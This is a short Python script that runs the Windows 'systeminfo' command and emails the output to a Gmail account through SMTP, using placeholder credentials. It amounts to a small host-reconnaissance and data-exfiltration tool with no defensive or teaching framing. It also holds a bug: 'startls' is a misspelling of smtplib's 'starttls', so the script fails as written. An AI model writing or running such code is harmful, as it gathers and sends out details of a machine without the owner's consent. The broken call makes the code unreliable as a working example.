import smtplib
import subprocess

# code for sending mail
def send_mail(email, password, message):
    s = smtplib.SMTP("smtp.gmail.com", 587)
    s.startls()
    s.login(email, password)
    s.sendmail(email, email, message)
    s.quit()

# executing command systeminfo
output = subprocess.check_output("systeminfo", shell = True)

# sending mail
send_mail("email", "password", output)